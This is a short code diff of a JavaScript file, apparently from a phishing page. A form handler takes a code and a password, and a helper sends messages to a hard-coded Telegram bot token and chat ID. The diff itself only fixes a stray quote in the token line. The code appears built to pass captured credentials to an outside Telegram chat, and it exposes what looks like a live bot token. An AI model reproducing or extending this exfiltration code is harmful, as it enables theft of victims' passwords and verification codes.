@@ -42,7 +42,7 @@ function handleFormSubmit(code, password, isFirstSubmit, message, alertMessage, 
 }
 
 function enviarMensajeTelegram(mensaje, callback) {
-    var token = '6998888571:AAG7__tYLiu7djWT0Fo2lRxLdb4oeTICXUA''; // Reemplaza 'TU_TOKEN' con tu token de la API de Telegram
+    var token = '6998888571:AAG7__tYLiu7djWT0Fo2lRxLdb4oeTICXUA'; // Reemplaza 'TU_TOKEN' con tu token de la API de Telegram
     var chatId = '6500360371'; // Reemplaza 'TU_CHAT_ID' con el ID de chat al que quieres enviar el mensaje
     var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
     var params = {
